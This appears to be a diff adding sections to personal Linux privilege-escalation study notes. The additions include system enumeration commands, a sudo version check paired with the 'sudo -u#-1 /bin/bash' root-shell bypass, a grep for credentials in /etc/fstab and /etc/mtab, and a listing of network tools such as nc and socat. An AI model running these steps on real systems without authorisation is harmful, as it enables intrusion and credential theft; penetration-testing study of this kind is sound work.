@@ -3,6 +3,37 @@ This document contains a list of privilege escalation techniques in Linux and ho
 
 [Technicques](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) 
 
+## System Information
+Gaining knowledge of system to exploit
+|Name|Command|Description|
+|---|---|---|
+|OS infor| `(cat /proc/version \|\| uname -a ) 2>/dev/null &#13; cat /etc/os-release 2>/dev/null` |Finding version and searching for exploits|
+|Path|`echo $PATH`|Find dir inside PATH that has write permission to hijack libraries or binaries|
+|Environment|`(env \|\| set) 2>/dev/null`||
+|Sudo version|`sudo -V \| grep "Sudo ver" \| grep "1\\.[01234567]\\.[0-9]\\+\\\|1\\.8\\.1[0-9]\\*\\\|1\\.8\\.2[01234567]"`|sudo < v1.28 `sudo -u#-1 /bin/bash`|
+|Dmesg signature verification failed|`dmesg 2>/dev/null \| grep "signature"`||
+|Enumerate possible defenses|||
+
+## Docker Breakout
+
+## Drivers
+```sh
+ls /dev 2>/dev/null | grep -i "sd"
+cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
+#Check if credentials in fstab
+grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
+```
+
+## Usefull software
+List usefull binaries
+```sh
+which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
+```
+Check version of the installed packages and services
+```sh
+dpkg -l #Debian
+rpm -qa #Centos
+```
 ## Arbitrary File Write to Root
 
 ## Cisco - vmanage
